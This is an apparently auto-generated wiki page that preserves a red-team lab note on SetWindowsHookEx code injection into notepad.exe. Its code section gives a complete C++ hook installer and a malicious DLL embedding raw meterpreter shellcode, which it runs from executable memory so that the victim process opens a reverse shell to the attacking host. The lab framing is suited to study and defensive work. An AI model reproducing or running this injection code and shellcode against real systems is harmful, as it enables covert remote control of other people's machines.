---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# SetWindowHookEx Code Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-injection-process-injection-setwindowhookex-code-injection` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/setwindowhookex-code-injection.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [SetWindowHookEx Code Injection](../../topics/offensive-security/setwindowhookex-code-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-injection-process-injection-setwindowhookex-code-injection |
| name | SetWindowHookEx Code Injection |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/setwindowhookex-code-injection.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Annotation 2019-05-28 220920.png
- Annotation 2019-05-28 221340.png
- Annotation 2019-05-28 221427.png
- hookdll.gif
_body: "# SetWindowHookEx Code Injection\n\nWindows allow programs to install hooks to monitor various system events such\
  \ as mouse clicks and keyboard key presses by using `SetWindowHookEx`.\n\nIn this lab `SetWindowHookEx` is used to inject\
  \ a malicious DLL into notepad.exe, which then executes  meterpreter shellcode.\n\n## Overview\n\nThe workflow of the technique\
  \ is as follows:\n\n1. Create a malicious DLL that exports one function, which when invoked, executes meterpreter shellcode\n\
  2. Create another program that loads the malicious binary by:\n   1. Resolving address of the exported function\n   2. Installing\
  \ a keyboard hook. The hook is then pointed to the exported function\n3. Notepad.exe is launched by the victim and a keypress\
  \ is registered\n4. Since keyboard events are hooked, notepad.exe loads in our malicious dll and invokes the exported function\n\
  5. Metepreter session is established on the attacking system\n\n## Execution\n\nLet's create a DLL with an export a function\
  \ `spotlessExport` that executes meterpreter shellcode when invoked:\n\n![](<../../.gitbook/assets/Annotation 2019-05-28\
  \ 220920.png>)\n\nCompile the DLL and check if the export was successful. We can use `dumpbin.exe` to do this, but first\
  \ we need to find it (if we have Visual Studio installed):\n\n```csharp\ncmd /c dir /s/b c:\\dumpbin*\n```\n\n![](<../../.gitbook/assets/Annotation\
  \ 2019-05-28 221427.png>)\n\nThen use it like so to dump the exported functions:\n\n```\ndumpbin.exe dllhook.dll /exports\n\
  ```\n\nBelow shows the output of exported functions for `dllhook.dll` as presented by `CFF Explorer` (left) and dumpin:\n\
  \n![](<../../.gitbook/assets/Annotation 2019-05-28 221340.png>)\n\n## Demo\n\nBelow shows the technique in action:\n\n*\
  \ Process Explorer (top right) with notepad (bottom right) selected\n* In the middle - the code that installs the hook to\
  \ all threads that are in the same desktop as the calling thread\n* Attacking system with multi-handler on the left - ready\
  \ to catch the meterpreter\n* Once the hook is installed and a key is pressed in when notepad is in focus, `dllhook.dll`\
  \ is loaded into `notepad.exe` process and our malicious exported function `exportedSpotless` is executed, which in turn\
  \ results in a meterpreter shell\n\n![](../../.gitbook/assets/hookdll.gif)\n\n## Code\n\nBoth `hooks.cpp` and `dllhook.cpp`\
  \ are provided below:\n\n{% tabs %}\n{% tab title=\"hooks.cpp\" %}\n```cpp\n#include \"pch.h\"\n#include <iostream>\n#include\
  \ <Windows.h>\n\nint main()\n{\n\tHMODULE library = LoadLibraryA(\"dllhook.dll\");\n\tHOOKPROC hookProc = (HOOKPROC)GetProcAddress(library,\
  \ \"spotlessExport\");\n\n\tHHOOK hook = SetWindowsHookEx(WH_KEYBOARD, hookProc, library, 0);\n\tSleep(10*1000);\n\tUnhookWindowsHookEx(hook);\n\
  \n\treturn 0;\n}\n```\n{% endtab %}\n\n{% tab title=\"dllhook.cpp\" %}\n```cpp\n#include \"stdafx.h\"\n\nBOOL APIENTRY DllMain(\
  \ HMODULE hModule,\n                       DWORD  ul_reason_for_call,\n                       LPVOID lpReserved\n      \
  \               )\n{\n    switch (ul_reason_for_call)\n    {\n\tcase DLL_PROCESS_ATTACH:\n    case DLL_THREAD_ATTACH:\n\
  \    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n\nextern \"C\" __declspec(dllexport)\
  \ int spotlessExport() {\n\tunsigned char shellcode[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\\
  x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\\
  x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\\
  x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\\\
  x85\\x72\\x00\\x00\\x00\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\\
  x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\\
  xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\\
  x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\\
  xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\\
  x59\\x5a\\x48\\x8b\\x12\\xe9\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00\\x41\\x56\\x49\\\
  x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5\\x49\\xbc\\x02\\x00\\x01\\xbb\\x0a\\x00\\x00\\x05\\x41\\x54\\\
  x49\\x89\\xe4\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68\\x01\\x01\\x00\\x00\\x59\\x41\\\
  xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89\\\
  xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\\
  xe2\\x48\\x89\\xf9\\x41\\xba\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5\\xe8\\x93\\x00\\\
  x00\\x00\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9\\x6a\\x04\\x41\\x58\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\\
  x5f\\xff\\xd5\\x83\\xf8\\x00\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41\\x59\\x68\\x00\\x10\\x00\\x00\\\
  x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31\\\
  xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\\
  x41\\x57\\x59\\x68\\x00\\x40\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\\x30\\xff\\xd5\\x57\\x59\\x41\\\
  xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x49\\xff\\xce\\xe9\\x3c\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\\x85\\xf6\\\
  x75\\xb4\\x41\\xff\\xe7\\x58\\x6a\\x00\\x59\\x49\\xc7\\xc2\\xf0\\xb5\\xa2\\x56\\xff\\xd5\";\n\n\tvoid *exec = VirtualAlloc(0,\
  \ sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\tmemcpy(exec, shellcode, sizeof shellcode);\n\t((void(*)())exec)();\n\
  \t\n\treturn 0;\n}\n```\n{% endtab %}\n{% endtabs %}\n\n## References\n\n{% embed url=\"https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-setwindowshookexa\"\
  \ %}\n\n{% embed url=\"https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport?view=vs-2019\"\
  \ %}"
_relative_path: offensive-security/code-injection-process-injection/setwindowhookex-code-injection.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/setwindowhookex-code-injection.md
````
